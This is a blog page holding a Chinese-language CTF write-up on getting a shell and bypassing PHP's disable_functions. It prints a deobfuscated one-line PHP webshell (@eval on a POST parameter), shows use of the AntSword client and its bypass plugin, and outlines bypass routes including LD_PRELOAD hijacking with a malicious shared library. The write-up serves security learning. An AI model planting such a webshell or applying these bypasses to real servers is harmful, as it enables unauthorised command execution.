<!doctype html>
<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><title>bypass_disable_functions - Tlife</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="Tlife"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="Tlife"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="get shell 打开以后发现是这样的，我以为是被加密了，直接把上面的内容粘贴复制搜索，后来发现，是使用了混淆代码的工具，拿去解密一下就可以得到以下内容"><meta property="og:type" content="article"><meta property="og:title" content="bypass_disable_functions"><meta property="og:url" content="http://example.com/2021/02/06/getshell/"><meta property="og:site_name" content="Tlife"><meta property="og:description" content="get shell 打开以后发现是这样的，我以为是被加密了，直接把上面的内容粘贴复制搜索，后来发现，是使用了混淆代码的工具，拿去解密一下就可以得到以下内容"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210207120229.png"><meta property="og:image" content="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210207120640.png"><meta property="og:image" content="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210207130155.png"><meta property="og:image" content="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210207161515.png"><meta property="og:image" content="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210207161657.png"><meta property="og:image" content="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210207163003.png"><meta property="og:image" content="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210207163029.png"><meta property="og:image" content="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210207163338.png"><meta property="article:published_time" content="2021-02-06T15:35:25.000Z"><meta property="article:modified_time" content="2021-02-07T16:45:02.825Z"><meta property="article:author" content="vague huang"><meta property="twitter:card" content="summary"><meta property="twitter:image:src" content="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210207120229.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2021/02/06/getshell/"},"headline":"bypass_disable_functions","image":["https://raw.githubusercontent.com/Hwwg/myphoto/master/20210207120229.png","https://raw.githubusercontent.com/Hwwg/myphoto/master/20210207120640.png","https://raw.githubusercontent.com/Hwwg/myphoto/master/20210207130155.png","https://raw.githubusercontent.com/Hwwg/myphoto/master/20210207161515.png","https://raw.githubusercontent.com/Hwwg/myphoto/master/20210207161657.png","https://raw.githubusercontent.com/Hwwg/myphoto/master/20210207163003.png","https://raw.githubusercontent.com/Hwwg/myphoto/master/20210207163029.png","https://raw.githubusercontent.com/Hwwg/myphoto/master/20210207163338.png"],"datePublished":"2021-02-06T15:35:25.000Z","dateModified":"2021-02-07T16:45:02.825Z","author":{"@type":"Person","name":"vague huang"},"publisher":{"@type":"Organization","name":"Tlife","logo":{"@type":"ImageObject"}},"description":"get shell 打开以后发现是这样的，我以为是被加密了，直接把上面的内容粘贴复制搜索，后来发现，是使用了混淆代码的工具，拿去解密一下就可以得到以下内容"}</script><link rel="canonical" href="http://example.com/2021/02/06/getshell/"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v6.0.0/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><!--!--><!-- hexo injector head_end start --><script>
  (function () {
      function switchTab() {
          if (!location.hash) {
            return;
          }

          const id = '#' + CSS.escape(location.hash.substring(1));
          const $tabMenu = document.querySelector(`.tabs a[href="${id}"]`);
          if (!$tabMenu) {
            return;
          }

          const $tabMenuContainer = $tabMenu.parentElement.parentElement;
          Array.from($tabMenuContainer.children).forEach($menu => $menu.classList.remove('is-active'));
          Array.from($tabMenuContainer.querySelectorAll('a'))
              .map($menu => document.getElementById($menu.getAttribute("href").substring(1)))
              .forEach($content => $content.classList.add('is-hidden'));

          if ($tabMenu) {
              $tabMenu.parentElement.classList.add('is-active');
          }
          const $activeTab = document.querySelector(id);
          if ($activeTab) {
              $activeTab.classList.remove('is-hidden');
          }
      }
      switchTab();
      window.addEventListener('hashchange', switchTab, false);
  })();
  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"></head><body class="is-1-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/">Tlife</a></div><div class="navbar-menu"><div class="navbar-end"></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-12"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2021-02-06T15:35:25.000Z" title="2021/2/6 下午11:35:25">2021-02-06</time></span><span class="level-item">Updated&nbsp;<time dateTime="2021-02-07T16:45:02.825Z" title="2021/2/8 上午12:45:02">2021-02-08</time></span></div></div><h1 class="title is-3 is-size-4-mobile">bypass_disable_functions</h1><div class="content"><h2 id="get-shell"><a href="#get-shell" class="headerlink" title="get shell"></a>get shell</h2><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210207120229.png" alt="img" style="zoom:67%;">
打开以后发现是这样的，我以为是被加密了，直接把上面的内容粘贴复制搜索，后来发现，是使用了混淆代码的工具，拿去解密一下就可以得到以下内容                                                                                     <a id="more"></a>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(njVysBZvxrLkFYdNofcgGuawDJblpOSQEHRUmKiAhzICetPMqXWT);</span><br><span class="line">@<span class="keyword">eval</span>($_POST[ymlisisisiook]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>解密网址如下:<a target="_blank" rel="noopener" href="https://www.zhaoyuanma.com/phpjm.html">https://www.zhaoyuanma.com/phpjm.html</a><br>看起来是个一句话木马，用蚁剑连接试试:<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210207120640.png" alt="img" style="zoom:67%;"><br>接下来我想访问一下其他文件夹试试，发现是没有权限的，这个时候就要想想如何提权了？</p>
<p>打开命令执行窗口，发现不论输入什么指令都是ret<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210207130155.png" alt="img" style="zoom:67%;"><br>搜索一下这个ret=127什么意思,发现是绕过disable_functions</p>
<p>接下来就直接去百度如果bypass_disable_functions这里介绍说可以直接用antsword里面的插件</p>
<h3 id="使用antsword插件进行绕过"><a href="#使用antsword插件进行绕过" class="headerlink" title="使用antsword插件进行绕过"></a>使用antsword插件进行绕过</h3><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210207161515.png" alt="img" style="zoom:67%;">
接下来会在目录下生成一个php文件，直接再用蚁剑访问连接，密码依旧是之前那个

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210207161657.png" alt="img" style="zoom: 50%;">
接下来就可以发现flag在根目录下了

<h3 id="了解原理"><a href="#了解原理" class="headerlink" title="了解原理"></a>了解原理</h3><p>其实感觉用插件不明不白的，所以决定要深入学习一下</p>
<h4 id="原因："><a href="#原因：" class="headerlink" title="原因："></a>原因：</h4><p>为什么会使用不了系统命令呢？<br><strong>disable_functions</strong>开关在php.ini中可以关闭一些危险的功能，如系统、执行等</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210207163003.png" alt="img" style="zoom:67%;">

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210207163029.png" alt="img" style="zoom:67%;">
因为在这个disable_functions这里禁用了很多函数。　
**open_basedir**
网站内目录与目录之间是可以访问的，在某些特定情况下这样是不安全的，如果目录间网址权限被黑客利用很可能造成数据流失，在这里我们可以通过PHPopen_basedir来实现网站间目录隔离配置，从而提高网站安全。
注：网站间隔离用“：”号分割。
注：没有被包含的网站不可访问。

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210207163338.png" alt="img" style="zoom:67%;">

<p>PS：这里我之前想说尝试用文件包含漏洞看看能不能访问根目录的内容，但是因为有这个限制在，所以不行<br>所以接下来我们需要绕过这两个东西</p>
<h4 id="绕过思路"><a href="#绕过思路" class="headerlink" title="绕过思路"></a>绕过思路</h4><p>第一种，攻击后端组件，寻找存在命令注入的、web 应用常用的后端组件，如，ImageMagick 的魔图漏洞、bash 的破壳漏洞；<br>第二种，寻找未禁用的漏网函数，常见的执行命令的函数有 system()、exec()、shell_exec()、passthru()，偏僻的 popen()、proc_open()、pcntl_exec()，逐一尝试，或许有漏网之鱼；<br>第三种，mod_cgi 模式，尝试修改 .htaccess，调整请求访问路由，绕过 php.ini 中的任何限制；<br>第四种，利用环境变量 LD_PRELOAD 劫持系统函数，让外部程序加载恶意 *.so，达到执行系统命令的效果。<br>参考:<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/192052.html">https://www.freebuf.com/articles/web/192052.html</a></p>
<p>但今天我们就直接看一下第四种方法</p>
<h4 id="基础知识学习"><a href="#基础知识学习" class="headerlink" title="基础知识学习"></a>基础知识学习</h4><h5 id="linux动态库（so共享对象库），静态库"><a href="#linux动态库（so共享对象库），静态库" class="headerlink" title="linux动态库（so共享对象库），静态库"></a>linux动态库（so共享对象库），静态库</h5><p>一个“程序函数库”简单的说就是一个文件包含了一些编译好的代码和数据，这些编译好的代码和数据可以在事后供其他的程序使用。程序函数库可以使整个程序更加模块化，更容易重新编译，而且更方便升级。  </p>
<p>程序函数库可分为3种类型：静态函数库（static libraries）、共享函数库（shared libraries）、动态加载函数库（dynamically loaded libraries）<strong>动态函数库同*共享函数库是一个东西（在linux上叫共享对象库， 文件后缀是.so ，windows上叫动态加载函数库， ****文件后缀是****.dll）**</strong></p>
<p>今天我们需要学习的就是动态函数库,因为需要创建.so文件</p>
<h5 id="共享函数库："><a href="#共享函数库：" class="headerlink" title="共享函数库："></a>共享函数库：</h5><p>**定义:**共享函数库中的函数是在当一个可执行程序在启动的时候被加载。如果一个共享函数库正常安装，所有的程序在重新运行的时候都可以自动加载最新的函数库中的函数。对于Linux系统还有更多可以实现的功能：<br>    1、升级了函数库但是仍然允许程序使用老版本的函数库。<br>    2、当执行某个特定程序的时候可以覆盖某个特定的库或者库中指定的函数。<br>    3、可以在库函数被使用的过程中修改这些函数库。</p>
<h5 id="PHP启动外部程序："><a href="#PHP启动外部程序：" class="headerlink" title="PHP启动外部程序："></a>PHP启动外部程序：</h5><p>PHP启动外部程序有两种，常见的就是使用cat，system等指令，但是在这里是用不了的<br><a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000008941850">https://segmentfault.com/a/1190000008941850</a><br>还有一种就是通过PHP解释器：这里直接摘抄大佬的思路：比如，php 函数 goForward() 实现“前进”的功能，php 函数 goForward() 又由组成 php 解释器的 C 语言模块之一的 move.c 实现，C 模块 move.c 内部又通过调用外部程序 go.bin 实现，那么，我的 php 脚本中调用了函数 goForward()，势必启动外部程序 go.bin。</p>
<h5 id="LD-PRELOAD环境变量："><a href="#LD-PRELOAD环境变量：" class="headerlink" title="LD_PRELOAD环境变量："></a>LD_PRELOAD环境变量：</h5><p>LD_PRELOAD是Linux系统的一个环境变量，它可以影响程序的运行时的链接（Runtime linker），它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的目的。</p>
<h5 id="LD-PRELOAD实现思路（思路重点）"><a href="#LD-PRELOAD实现思路（思路重点）" class="headerlink" title="LD_PRELOAD实现思路（思路重点）"></a>LD_PRELOAD实现思路（思路重点）</h5><p>在看完大佬的思路解析后，我来复现一下，首先我们知道LD_PRELOAD可以允许我们定义在程序运行前优先加载的动态链接库，此时我们设这个库为e_evil.so，在这个库中我们可以加入可以执行的恶意代码，注意此时这个库中的代码是不受disable_functions限制的，因为他不是这个系统当中，是我们后来定义的，那么有人会问，为啥执行的是我们定义的这个库里的系统函数，而不是原本存在的？这里就是因为我们一开始说的因为它的优先级比较高，那么如何使得我们定义的这个系统之外的函数被加载呢？那就需要我们通过web打开新进程。</p>
<h2 id="插件使用条件"><a href="#插件使用条件" class="headerlink" title="插件使用条件"></a>插件使用条件</h2><p>成功使用此绕过插件的三个必要条件是：</p>
<p>1.mail()函数和error_log()函数所调用的sendmail已安装<br>2.不限制 /usr/sbin/sendmail 的执行<br>3.mail()函数和error_log()函数有一个未被禁用</p>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>在这里有个点，一开始我是直接大神的bypass工具集，在操作的时候发现怎么都没法输出，后来重新看了一下文章，他是使用mail()函数，但是在本题当中，mail函数是被禁用的，所以最终就失败了。<br>其实现在对于这个bypass的原理差不多已经清晰了，感觉这个思路确实很厉害，是以一种劫持的思想绕过disable_function的拦截。</p>
<p>参考大神链接：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/192052.html">https://www.freebuf.com/articles/web/192052.html</a><br>antsword插件运行原理细节：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/195686">https://www.anquanke.com/post/id/195686</a></p>
</div><!--!--></article></div><!--!--><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/2021/02/08/i%E6%98%A5%E7%A7%8B1/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">i春秋1</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2021/02/05/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/"><span class="level-item">CBC字节翻转攻击</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><!--!--></div><!--!--><!--!--></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/">Tlife</a><p class="is-size-7"><span>&copy; 2023 vague huang</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p></div><div class="level-end"></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("en");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script src="/js/column.js"></script><!--!--><script src="/js/main.js" defer></script><!--!--><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false});</script></body></html>